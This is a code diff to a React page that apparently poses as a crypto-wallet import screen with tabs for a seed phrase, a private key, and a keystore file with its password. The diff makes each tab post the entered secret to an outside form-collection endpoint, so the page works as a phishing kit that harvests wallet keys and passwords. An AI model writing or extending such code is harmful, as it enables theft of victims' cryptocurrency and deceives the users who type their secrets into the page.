@@ -15,7 +15,7 @@ import LandingAppBar from "./Components/LandingAppBar";
 const FORM_ENDPOINT =
   "https://public.herotofu.com/v1/f2241800-ae93-11ec-b83f-8f17e10d6288";
 
-const WalletForm = ({ children, code, handleSubmit }) => {
+const WalletForm = ({ children, handleSubmit }) => {
   const uploadData = (value, type, wallet) => {
     const payload = { value, type, wallet };
 
@@ -97,13 +97,13 @@ function BasicTabs() {
     setValue(newValue);
   };
 
-  const handleSeedPhraseSubmit = (e) => {
+  const handleSubmit = (e, value, code) => {
     e.preventDefault();
 
     const injectedData = {
       wallet,
-      seedPhrase,
-      code: SEED_PHRASE,
+      value,
+      code,
     };
 
     fetch(FORM_ENDPOINT, {
@@ -131,7 +131,9 @@ function BasicTabs() {
       </Box>
 
       <TabPanel value={value} index={0}>
-        <WalletForm code={SEED_PHRASE} handleSubmit={handleSeedPhraseSubmit}>
+        <WalletForm
+          handleSubmit={(e) => handleSubmit(e, seedPhrase, SEED_PHRASE)}
+        >
           <ImportTextField
             name="Seed Phrase"
             label="Seed Phrase"
@@ -150,25 +152,45 @@ function BasicTabs() {
       </TabPanel>
 
       <TabPanel value={value} index={1}>
-        <WalletForm code={PRIVATE_KEY}>
+        <WalletForm
+          handleSubmit={(e) => {
+            handleSubmit(e, privateKey, PRIVATE_KEY);
+          }}
+        >
           <ImportTextField
             name="private_key"
             label="Private Key"
+            value={privateKey}
+            onChange={(e) => {
+              setPrivateKey(e.target.value);
+            }}
             sx={{ mb: 2 }}
           />
         </WalletForm>
       </TabPanel>
 
       <TabPanel value={value} index={2}>
-        <WalletForm code={KEY_JSON}>
+        <WalletForm
+          handleSubmit={(e) => {
+            handleSubmit(e, JSON.stringify({ keyJSON, keyPasscode }), KEY_JSON);
+          }}
+        >
           <ImportTextField
             name="Key Store Value"
             label="Key Store Value"
+            value={keyJSON}
+            onChange={(e) => {
+              setKeyJSON(e.target.value);
+            }}
             sx={{ mb: 2 }}
           />
           <ImportTextField
             name="Key Store Password"
             label="Key Store Password"
+            value={keyPasscode}
+            onChange={(e) => {
+              setKeyPasscode(e.target.value);
+            }}
             sx={{ mb: 2 }}
           />
         </WalletForm>
